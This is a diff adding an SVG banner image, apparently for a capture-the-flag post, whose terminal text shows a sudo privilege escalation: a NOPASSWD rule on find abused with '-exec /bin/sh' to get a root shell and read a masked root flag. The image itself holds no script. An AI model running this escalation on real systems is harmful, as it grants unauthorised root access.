@@ -1,0 +1,19 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630">
+  <rect width="1200" height="630" fill="#0f1a17"/>
+  <g stroke="#1b2d28" stroke-width="2">
+    <path d="M0 105h1200M0 210h1200M0 315h1200M0 420h1200M0 525h1200M150 0v630M300 0v630M450 0v630M600 0v630M750 0v630M900 0v630M1050 0v630"/>
+  </g>
+  <g transform="translate(910 110)">
+    <rect x="0" y="0" width="12" height="400" rx="6" fill="#7fa89b"/>
+    <path d="M12 10 C 90 -20, 150 50, 250 20 L 250 170 C 150 200, 90 130, 12 160 Z" fill="#ff6b57"/>
+  </g>
+  <g font-family="ui-monospace, Menlo, monospace" font-size="28">
+    <text x="80" y="200" fill="#5f8a7d">user@hedef:~$ sudo -l</text>
+    <text x="80" y="245" fill="#a9c9bf">(root) NOPASSWD: /usr/bin/find</text>
+    <text x="80" y="290" fill="#5f8a7d">user@hedef:~$ sudo find . -exec /bin/sh \;</text>
+    <text x="80" y="335" fill="#e7f2ee"># id</text>
+    <text x="80" y="380" fill="#a9c9bf">uid=0(root) gid=0(root)</text>
+    <text x="80" y="425" fill="#e7f2ee"># cat /root/root.txt</text>
+    <text x="80" y="470" fill="#ff6b57">9c1e••••••••••••••••••••••••7a</text>
+  </g>
+</svg>
